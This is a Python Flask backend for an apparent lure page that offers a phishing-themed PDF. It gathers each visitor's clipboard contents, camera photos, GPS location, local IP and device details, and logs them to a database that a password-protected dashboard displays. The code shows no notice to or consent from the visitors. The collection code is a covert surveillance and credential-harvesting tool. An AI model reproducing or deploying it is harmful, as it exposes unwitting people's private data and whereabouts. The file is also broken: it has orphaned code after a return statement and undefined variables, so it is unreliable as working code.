from flask import Flask, request, send_from_directory, render_template, jsonify, session, redirect, url_for
import os, sqlite3, hashlib, requests, json
from datetime import datetime
from user_agents import parse

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'dev-key-change-in-production')
UPLOAD_FOLDER = 'uploads'
DB_FILE = 'logs.db'
REPORT_PASSWORD = os.environ.get('REPORT_PASSWORD', 'sms')
os.makedirs(os.path.join(UPLOAD_FOLDER, 'photos'), exist_ok=True)

with sqlite3.connect(DB_FILE) as conn:
    conn.execute('''CREATE TABLE IF NOT EXISTS access_log (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        session_id TEXT,
        filename TEXT, ip TEXT, lat REAL, lon REAL, timestamp TEXT, photo TEXT,
        user_agent TEXT, device_type TEXT, browser TEXT, os TEXT, 
        country TEXT, region TEXT, city TEXT, isp TEXT,
        screen_width INTEGER, screen_height INTEGER, timezone TEXT, language TEXT,
        hostname TEXT, public_ip TEXT, local_ip TEXT, clipboard_data TEXT)''')
    
    # Add new columns if they don't exist (for existing databases)
    try:
        conn.execute('ALTER TABLE access_log ADD COLUMN hostname TEXT')
    except sqlite3.OperationalError:
        pass
    try:
        conn.execute('ALTER TABLE access_log ADD COLUMN public_ip TEXT')
    except sqlite3.OperationalError:
        pass
    try:
        conn.execute('ALTER TABLE access_log ADD COLUMN local_ip TEXT')
    except sqlite3.OperationalError:
        pass
    try:
        conn.execute('ALTER TABLE access_log ADD COLUMN clipboard_data TEXT')
    except sqlite3.OperationalError:
        pass
    try:
        conn.execute('ALTER TABLE access_log ADD COLUMN photo_path TEXT')
    except sqlite3.OperationalError:
        pass
    try:
        conn.execute('ALTER TABLE access_log ADD COLUMN session_id TEXT')
    except sqlite3.OperationalError:
        pass
    try:
        conn.execute('ALTER TABLE access_log ADD COLUMN cookie_enabled TEXT')
    except sqlite3.OperationalError:
        pass
    try:
        conn.execute('ALTER TABLE access_log ADD COLUMN online_status TEXT')
    except sqlite3.OperationalError:
        pass
    try:
        conn.execute('ALTER TABLE access_log ADD COLUMN referrer TEXT')
    except sqlite3.OperationalError:
        pass
    try:
        conn.execute('ALTER TABLE access_log ADD COLUMN accuracy TEXT')
    except sqlite3.OperationalError:
        pass
    try:
        conn.execute('ALTER TABLE access_log ADD COLUMN geo_error TEXT')
    except sqlite3.OperationalError:
        pass
    try:
        conn.execute('ALTER TABLE access_log ADD COLUMN clipboard_error TEXT')
    except sqlite3.OperationalError:
        pass
    try:
        conn.execute('ALTER TABLE access_log ADD COLUMN photo_error TEXT')
    except sqlite3.OperationalError:
        pass
    try:
        conn.execute('ALTER TABLE access_log ADD COLUMN collection_complete TEXT')
    except sqlite3.OperationalError:
        pass
    try:
        conn.execute('ALTER TABLE access_log ADD COLUMN collection_error TEXT')
    except sqlite3.OperationalError:
        pass
    try:
        conn.execute('ALTER TABLE access_log ADD COLUMN partial_collection TEXT')
    except sqlite3.OperationalError:
        pass

    # Cleanup previously polluted fields from older incremental mapping logic.
    conn.execute("UPDATE access_log SET browser = NULL WHERE browser IN ('true', 'false', 'True', 'False')")
    conn.execute("UPDATE access_log SET os = NULL WHERE os LIKE 'User cancelled%' OR os LIKE 'Collection %'")
    conn.execute("UPDATE access_log SET device_type = NULL WHERE device_type IN ('true', 'false', 'True', 'False')")
    conn.commit()

@app.route('/')
def index():
    return render_template('index.html')

def get_geo_info(ip):
    """Get geographic information for an IP address - optimized for speed"""
    print(f"[DEBUG] Getting geo info for IP: {ip}")
    
    # Skip private/local IP addresses
    if (ip in ['127.0.0.1', 'localhost', 'Unknown'] or 
        ip.startswith('192.168.') or ip.startswith('10.') or 
        ip.startswith('172.16.') or ip.startswith('172.17.') or 
        ip.startswith('172.18.') or ip.startswith('172.19.') or
        ip.startswith('172.2') or ip.startswith('172.3')):
        print(f"[DEBUG] Skipping private IP: {ip}")
        return {'country': 'Private Network', 'region': 'Local', 'city': 'Local', 'isp': 'Private'}
    
    # Use fastest, most reliable service first with short timeout
    try:
        print(f"[DEBUG] Trying ip-api.com for IP: {ip}")
        url = f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,isp,query"
        response = requests.get(url, timeout=3)  # Reduced from 10 to 3 seconds
        
        if response.status_code == 200:
            data = response.json()
            print(f"[DEBUG] Response data: {data}")
            
            if data.get('status') == 'success':
                return {
                    'country': data.get('country', 'Unknown'),
                    'region': data.get('regionName', 'Unknown'), 
                    'city': data.get('city', 'Unknown'),
                    'isp': data.get('isp', 'Unknown')
                }
            else:
                print(f"[DEBUG] ip-api.com failed: {data.get('message', 'Unknown error')}")
        
    except Exception as e:
        print(f"[DEBUG] Geolocation failed for {ip}: {e}")
    
    # Return default values if geolocation fails
    return {'country': 'Unknown', 'region': 'Unknown', 'city': 'Unknown', 'isp': 'Unknown'}
                    return {
                        'country': data.get('country', 'Unknown'),
                        'region': data.get('region', 'Unknown'), 
                        'city': data.get('city', 'Unknown'),
                        'isp': data.get('connection', {}).get('org', 'Unknown')
                    }
                    
        except Exception as e:
            print(f"[DEBUG] Service {service_url} failed: {str(e)}")
            continue
    
    print("[DEBUG] All geolocation services failed")
    return {'country': 'Unknown', 'region': 'Unknown', 'city': 'Unknown', 'isp': 'Unknown'}

def get_client_ip(request):
    """Get the real client IP address, handling proxies and load balancers"""
    # Check for forwarded headers (common with proxies/load balancers)
    forwarded_for = request.headers.get('X-Forwarded-For')
    if forwarded_for:
        # X-Forwarded-For can contain multiple IPs, first one is usually the client
        client_ip = forwarded_for.split(',')[0].strip()
        if client_ip and not client_ip.startswith('127.') and not client_ip.startswith('192.168.'):
            return client_ip
    
    # Check other common proxy headers
    real_ip = request.headers.get('X-Real-IP')
    if real_ip and not real_ip.startswith('127.') and not real_ip.startswith('192.168.'):
        return real_ip
    
    # Check Cloudflare header
    cf_ip = request.headers.get('CF-Connecting-IP')
    if cf_ip and not cf_ip.startswith('127.') and not cf_ip.startswith('192.168.'):
        return cf_ip
    
    # Fallback to remote_addr
    remote_ip = request.remote_addr
    if remote_ip and not remote_ip.startswith('127.') and not remote_ip.startswith('192.168.'):
        return remote_ip
    
    return 'Unknown'

def get_public_ip():
    """Get server's public IP (fallback only)"""
    try:
        # Single fast service with short timeout
        response = requests.get('https://api.ipify.org', timeout=2)
        if response.status_code == 200:
            return response.text.strip()
    except:
        pass
    return 'Unknown'

@app.route('/save-incremental', methods=['POST'])
def save_incremental():
    """Save data incrementally as it's collected"""
    try:
        session_id = request.form.get('session_id')
        data_type = request.form.get('data_type', 'Unknown')
        
        if not session_id:
            return jsonify({'error': 'No session ID provided'}), 400
        
        # Get basic request info
        ip = get_client_ip(request)  # Use real client IP instead of server IP
        user_agent_string = request.headers.get('User-Agent', '')
        user_agent = parse(user_agent_string)
        timestamp = datetime.now().isoformat()

        # Get geolocation for client IP
        geo_info = get_geo_info(ip)
        
        # Create a new database connection for this request
        local_conn = sqlite3.connect(DB_FILE)
        local_cursor = local_conn.cursor()
        
        # Check if this session already exists in database
        local_cursor.execute('SELECT id FROM access_log WHERE session_id = ?', (session_id,))
        existing_record = local_cursor.fetchone()
        
        if existing_record:
            # Update existing record with new data
            record_id = existing_record[0]
            
            # Build update query dynamically based on available form data
            update_fields = []
            update_values = []
            
            # Handle photo upload separately
            if 'photo' in request.files:
                photo = request.files['photo']
                if photo and photo.filename:
                    filename = f"photo_{record_id}_{timestamp.replace(':', '-')}.jpg"
                    photo_path = os.path.join('static', filename)
                    photo.save(photo_path)
                    update_fields.append('photo_path = ?')
                    update_values.append(filename)
            
            # Update other fields if provided
            field_mappings = {
                'latitude': 'lat',
                'longitude': 'lon',
                'screen_width': 'screen_width',
                'screen_height': 'screen_height',
                'timezone': 'timezone',
                'language': 'language',
                'hostname': 'hostname',
                'local_ip': 'local_ip',
                'clipboard_data': 'clipboard_data',
                'user_agent': 'user_agent',
                'cookie_enabled': 'cookie_enabled',
                'online_status': 'online_status',
                'referrer': 'referrer',
                'accuracy': 'accuracy',
                'geo_error': 'geo_error',
                'clipboard_error': 'clipboard_error',
                'photo_error': 'photo_error',
                'collection_complete': 'collection_complete',
                'collection_error': 'collection_error',
                'partial_collection': 'partial_collection'
            }
            
            for form_key, db_field in field_mappings.items():
                if form_key in request.form:
                    value = request.form.get(form_key)
                    if value and value != 'Unknown':
                        update_fields.append(f'{db_field} = ?')
                        update_values.append(value)
            
            if update_fields:
                update_values.append(record_id)
                update_query = f"UPDATE access_log SET {', '.join(update_fields)} WHERE id = ?"
                local_cursor.execute(update_query, update_values)
                local_conn.commit()
                
                print(f"[DEBUG] Updated record {record_id} with {data_type}")
        
        else:
            # Create new record with initial data
            local_cursor.execute('''
                INSERT INTO access_log (
                    session_id,
                    ip, user_agent, device_type, browser, os, country, region, city, isp,
                    screen_width, screen_height, timezone, language, hostname, public_ip, local_ip,
                    clipboard_data, lat, lon, timestamp
                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                session_id,
                ip,
                request.form.get('user_agent', user_agent_string),
                user_agent.device.family if hasattr(user_agent.device, 'family') else 'Unknown',
                user_agent.browser.family if hasattr(user_agent.browser, 'family') else 'Unknown',
                user_agent.os.family if hasattr(user_agent.os, 'family') else 'Unknown',
                geo_info.get('country', 'Unknown'),
                geo_info.get('region', 'Unknown'),
                geo_info.get('city', 'Unknown'),
                geo_info.get('isp', 'Unknown'),
                request.form.get('screen_width', 0),
                request.form.get('screen_height', 0),
                request.form.get('timezone', 'Unknown'),
                request.form.get('language', 'Unknown'),
                request.form.get('hostname', session_id),  # Use session_id as hostname for tracking
                public_ip,
                request.form.get('local_ip', 'Unknown'),
                request.form.get('clipboard_data', ''),
                request.form.get('latitude', 'Unknown'),
                request.form.get('longitude', 'Unknown'),
                timestamp
            ))
            
            record_id = local_cursor.lastrowid
            local_conn.commit()
            
            # Handle photo for new record
            if 'photo' in request.files:
                photo = request.files['photo']
                if photo and photo.filename:
                    filename = f"photo_{record_id}_{timestamp.replace(':', '-')}.jpg"
                    photo_path = os.path.join('static', filename)
                    photo.save(photo_path)
                    
                    local_cursor.execute('UPDATE access_log SET photo_path = ? WHERE id = ?', 
                                 (filename, record_id))
                    local_conn.commit()
            
            print(f"[DEBUG] Created new record {record_id} for session {session_id}")
        
        # Close the local connection
        local_conn.close()
        
        return jsonify({
            'success': True, 
            'message': f'{data_type} saved successfully',
            'session_id': session_id,
            'record_id': record_id
        })
        
    except Exception as e:
        print(f"[ERROR] Incremental save failed: {str(e)}")
        return jsonify({'error': str(e)}), 500

@app.route('/upload-evidence', methods=['POST'])
def upload_evidence():
    photo = request.files['photo']
    lat = request.form.get('latitude')
    lon = request.form.get('longitude')
    screen_width = request.form.get('screen_width')
    screen_height = request.form.get('screen_height')
    timezone = request.form.get('timezone')
    language = request.form.get('language')
    hostname = request.form.get('hostname', 'Unknown')
    local_ip = request.form.get('local_ip', 'Unknown')
    clipboard_data = request.form.get('clipboard_data', '')
    
    ip = get_client_ip(request)  # Use real client IP
    user_agent_string = request.headers.get('User-Agent', '')
    user_agent = parse(user_agent_string)

    print(f"[DEBUG] Client IP: {ip}")

    # Get geolocation for client IP
    geo_info = get_geo_info(ip)
    
    print(f"[DEBUG] Geo info for {geo_ip}: {geo_info}")
    
    timestamp = datetime.utcnow().isoformat()
    filename = f"photo_{ip.replace('.', '_')}_{datetime.utcnow().strftime('%Y%m%d%H%M%S')}.jpg"
    photo.save(os.path.join(UPLOAD_FOLDER, 'photos', filename))
    
    with sqlite3.connect(DB_FILE) as conn:
        conn.execute("""INSERT INTO access_log (filename, ip, lat, lon, timestamp, photo,
                        user_agent, device_type, browser, os, country, region, city, isp,
                        screen_width, screen_height, timezone, language, hostname, public_ip, local_ip, clipboard_data)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""", 
                     ("smishing-and-phishing-explained.pdf", ip, lat, lon, timestamp, filename,
                      user_agent_string, user_agent.device.family, user_agent.browser.family,
                      user_agent.os.family, geo_info['country'], geo_info['region'], 
                      geo_info['city'], geo_info['isp'], screen_width, screen_height, timezone, language,
                      hostname, public_ip, local_ip, clipboard_data))
    return "Success"

@app.route('/uploads/photos/<filename>')
def photo(filename):
    return send_from_directory(os.path.join(UPLOAD_FOLDER, 'photos'), filename)

@app.route('/static/<filename>')
def static_file(filename):
    try:
        response = send_from_directory('static', filename, as_attachment=True, 
                                     download_name=filename)
        # Set proper headers for PDF downloads
        if filename.endswith('.pdf'):
            response.headers['Content-Type'] = 'application/pdf'
            response.headers['Content-Disposition'] = f'attachment; filename="{filename}"'
        return response
    except FileNotFoundError:
        return "File not found", 404

@app.route('/download/<filename>')
def download_file(filename):
    """Direct download route with better error handling"""
    try:
        import os
        file_path = os.path.join('static', filename)
        if not os.path.exists(file_path):
            return "File not found", 404
            
        response = send_from_directory('static', filename, as_attachment=True, 
                                     download_name=filename)
        response.headers['Content-Type'] = 'application/pdf'
        response.headers['Content-Disposition'] = f'attachment; filename="{filename}"'
        response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
        response.headers['Pragma'] = 'no-cache'
        response.headers['Expires'] = '0'
        return response
    except Exception as e:
        return f"Download error: {str(e)}", 500

@app.route('/list-access')
def list_access():
    if not session.get('authenticated'):
        return jsonify({'error': 'Authentication required'}), 401
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.execute("""SELECT id, filename, ip, lat, lon, timestamp, 
                                COALESCE(photo_path, photo) as photo,
                                user_agent, device_type, browser, os, country, region, city, isp,
                                screen_width, screen_height, timezone, language, hostname, public_ip, local_ip, clipboard_data
                                FROM access_log ORDER BY timestamp DESC""")
        columns = ['id', 'filename', 'ip', 'lat', 'lon', 'timestamp', 'photo', 'user_agent',
                  'device_type', 'browser', 'os', 'country', 'region', 'city', 'isp',
                  'screen_width', 'screen_height', 'timezone', 'language', 'hostname', 'public_ip', 'local_ip', 'clipboard_data']
        data = [dict(zip(columns, row)) for row in cursor.fetchall()]
    return jsonify(data)

@app.route('/analytics')
def analytics():
    with sqlite3.connect(DB_FILE) as conn:
        # Country stats
        country_cursor = conn.execute("SELECT country, COUNT(*) as count FROM access_log GROUP BY country ORDER BY count DESC")
        countries = [{'name': row[0], 'count': row[1]} for row in country_cursor.fetchall()]
        
        # Device type stats
        device_cursor = conn.execute("SELECT device_type, COUNT(*) as count FROM access_log GROUP BY device_type ORDER BY count DESC")
        devices = [{'name': row[0], 'count': row[1]} for row in device_cursor.fetchall()]
        
        # Browser stats
        browser_cursor = conn.execute("""
            SELECT browser, COUNT(*) as count
            FROM access_log
            WHERE browser IS NOT NULL
              AND TRIM(browser) != ''
              AND LOWER(browser) NOT IN ('unknown', 'true', 'false')
            GROUP BY browser
            ORDER BY count DESC
        """)
        browsers = [{'name': row[0], 'count': row[1]} for row in browser_cursor.fetchall()]
        
        # OS stats
        os_cursor = conn.execute("SELECT os, COUNT(*) as count FROM access_log GROUP BY os ORDER BY count DESC")
        operating_systems = [{'name': row[0], 'count': row[1]} for row in os_cursor.fetchall()]
        
        # ISP stats
        isp_cursor = conn.execute("SELECT isp, COUNT(*) as count FROM access_log GROUP BY isp ORDER BY count DESC LIMIT 10")
        isps = [{'name': row[0], 'count': row[1]} for row in isp_cursor.fetchall()]
        
    return jsonify({
        'countries': countries,
        'devices': devices,
        'browsers': browsers,
        'operating_systems': operating_systems,
        'isps': isps
    })

@app.route('/report')
def report():
    if not session.get('authenticated'):
        return redirect(url_for('login'))
    return render_template('report.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        password = request.form.get('password', '')
        if password == REPORT_PASSWORD:
            session['authenticated'] = True
            return redirect(url_for('report'))
        else:
            return render_template('login.html', error='Invalid password')
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.pop('authenticated', None)
    return redirect(url_for('index'))

@app.route('/geo.html')
def geo():
    return render_template('geo.html')

@app.route('/debug/sessions')
def debug_sessions():
    """Debug endpoint to see all session data"""
    if not session.get('authenticated'):
        return redirect(url_for('login'))
        
    try:
        local_conn = sqlite3.connect(DB_FILE)
        local_cursor = local_conn.cursor()
        
        local_cursor.execute('''
            SELECT id, hostname, timestamp, country, device_type, browser, os, 
                   lat, lon, clipboard_data, photo_path
            FROM access_log 
            ORDER BY timestamp DESC 
            LIMIT 20
        ''')
        
        sessions = []
        for row in local_cursor.fetchall():
            sessions.append({
                'id': row[0],
                'session_id': row[1],
                'timestamp': row[2],
                'country': row[3],
                'device_type': row[4],
                'browser': row[5],
                'os': row[6],
                'latitude': row[7],
                'longitude': row[8],
                'clipboard_data': row[9][:100] if row[9] else '',  # First 100 chars
                'has_photo': bool(row[10])
            })
        
        local_conn.close()
        
        return jsonify({
            'total_sessions': len(sessions),
            'sessions': sessions
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/debug/geo')
def debug_geo():
    """Debug endpoint to test geolocation functionality"""
    if not session.get('authenticated'):
        return redirect(url_for('login'))
    
    client_ip = get_client_ip(request)
    server_ip = get_public_ip()

    # Test geolocation with client IP
    client_geo = get_geo_info(client_ip)
    server_geo = get_geo_info(server_ip) if server_ip != 'Unknown' else {'error': 'No server public IP'}
    
    debug_info = {
        'client_ip': client_ip,
        'server_public_ip': server_ip,
        'client_geo_info': client_geo,
        'server_geo_info': server_geo,
        'headers': dict(request.headers),
        'timestamp': datetime.now().isoformat()
    }
    
    return jsonify(debug_info)

if __name__ == '__main__':
    import ssl
    import os
    
    # Use self-signed certificate
    print("Using self-signed certificate")
    context = ('ssl/server.crt', 'ssl/server.key')
    
    app.run(host='0.0.0.0', port=5000, ssl_context=context)
